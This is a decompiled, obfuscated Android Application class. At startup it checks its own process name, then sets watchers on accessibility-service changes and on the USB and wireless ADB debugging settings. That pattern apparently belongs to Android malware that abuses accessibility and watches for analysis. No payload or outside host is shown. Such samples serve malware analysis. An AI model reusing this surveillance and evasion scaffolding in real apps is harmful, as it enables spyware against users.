package afwemmzy;

import android.app.Application;
import android.os.Handler;
import android.os.Process;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import paua.blhtty;
import paua.kfll;
import paua.qoh;
import paua.roipit;
import paua.tzalr;

/* loaded from: classes.dex */
public class toteapi extends Application {
    public static String wurl() {
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(new File("/proc/" + Process.myPid() + "/cmdline")));
            String trim = bufferedReader.readLine().trim();
            bufferedReader.close();
            return trim;
        } catch (Exception unused) {
            return "";
        }
    }

    @Override // android.app.Application
    public void onCreate() {
        if (wurl().contains("xcmzqsawpqoefcds")) {
            return;
        }
        blhtty.opme();
        super.onCreate();
        registerActivityLifecycleCallbacks(new qoh());
        try {
            ((AccessibilityManager) getSystemService("accessibility")).addAccessibilityStateChangeListener(new kfll());
            roipit roipitVar = new roipit(new Handler());
            getContentResolver().registerContentObserver(Settings.Global.getUriFor("adb_enabled"), false, roipitVar);
            getContentResolver().registerContentObserver(Settings.Global.getUriFor("adb_wifi_enabled"), false, roipitVar);
            getContentResolver().registerContentObserver(Settings.Secure.getUriFor("enabled_accessibility_services"), false, new tzalr(new Handler()));
        } catch (Exception unused) {
        }
    }
}
